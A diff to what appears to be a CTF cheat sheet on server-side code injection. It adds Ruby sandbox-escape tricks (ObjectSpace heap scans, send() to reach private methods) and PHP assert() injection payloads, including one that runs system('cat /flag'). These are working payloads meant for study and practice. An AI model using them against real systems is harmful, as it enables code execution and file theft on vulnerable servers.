@@ -5,10 +5,12 @@
   - [instance_eval Breakout](#instance_eval-breakout)
   - [Bypassing Keyword Blocklists](#bypassing-keyword-blocklists)
   - [Exfiltration](#exfiltration)
+- [Ruby ObjectSpace Memory Scanning for Flag Extraction (Tokyo Westerns 2016)](#ruby-objectspace-memory-scanning-for-flag-extraction-tokyo-westerns-2016)
 - [Perl open() RCE](#perl-open-rce)
 - [LaTeX Injection RCE (Hack.lu CTF 2012)](#latex-injection-rce-hacklu-ctf-2012)
 - [Server-Side JS eval Blocklist Bypass](#server-side-js-eval-blocklist-bypass)
 - [PHP preg_replace /e Modifier RCE (PlaidCTF 2014)](#php-preg_replace-e-modifier-rce-plaidctf-2014)
+- [PHP assert() String Evaluation Injection (CSAW CTF 2016)](#php-assert-string-evaluation-injection-csaw-ctf-2016)
 - [Prolog Injection (PoliCTF 2015)](#prolog-injection-polictf-2015)
 - [ReDoS as Timing Oracle](#redos-as-timing-oracle)
 - [File Upload to RCE Techniques](#file-upload-to-rce-techniques)
@@ -62,6 +64,30 @@ open('public/out.txt','w'){|f|f.write(read_file('/flag.txt'))}
 ```
 
 **Key insight:** Ruby's `instance_eval` and `Kernel#open` are common injection sinks. When keywords like `File`, `system`, or `IO` are blocked, use `open('|cmd')` or `Process.spawn` -- Ruby has many built-in ways to execute commands that bypass simple blocklists.
+
+---
+
+## Ruby ObjectSpace Memory Scanning for Flag Extraction (Tokyo Westerns 2016)
+
+In Ruby sandbox challenges where direct variable access is blocked, use `ObjectSpace.each_object` to scan the entire heap for flag strings.
+
+```ruby
+# When you can't access the flag variable directly:
+# Method 1: ObjectSpace heap scan
+ObjectSpace.each_object(String) { |x| x[0..3] == "TWCT" and print x }
+
+# Method 2: Monkey-patch to access private methods
+# If object 'p' has private method 'flag':
+def p.x; flag end; p.x
+
+# Method 3: Use send() to bypass private visibility
+p.send(:flag)
+
+# Method 4: Use method() to get method object
+p.method(:flag).call
+```
+
+**Key insight:** Ruby's `ObjectSpace.each_object(String)` iterates every live String in the Ruby heap, including those stored in private variables or internal state. Filter by known flag prefix to extract the flag even when no direct reference exists.
 
 ---
 
@@ -142,6 +168,28 @@ $cookie = serialize($filter);
 ```
 
 **Key insight:** The `/e` modifier (deprecated in PHP 5.5, removed in PHP 7.0) turns `preg_replace` into an eval sink. In CTFs targeting PHP 5.x, check for `/e` in regex patterns. Combined with `unserialize()`, this enables RCE through POP gadget chains that set both pattern and replacement.
+
+---
+
+## PHP assert() String Evaluation Injection (CSAW CTF 2016)
+
+PHP's `assert()` evaluates string arguments as PHP code. When user input is concatenated into assert(), it enables code injection.
+
+```php
+// Vulnerable code pattern:
+assert("strpos('$page', '..') === false");
+
+// Injection payload via $page parameter:
+// ' and die(show_source('templates/flag.php')) or '
+// Results in: assert("strpos('' and die(show_source('templates/flag.php')) or '', '..') === false");
+
+// URL: ?page=' and die(show_source('templates/flag.php')) or '
+// Alternative payloads:
+// ' and die(system('cat /flag')) or '
+// '.die(highlight_file('config.php')).'
+```
+
+**Key insight:** PHP `assert()` with string arguments acts like `eval()`. This was deprecated in PHP 7.2 and removed in PHP 8.0, but legacy applications remain vulnerable. Look for `assert()` in source code (especially via exposed `.git` directories).
 
 ---
 
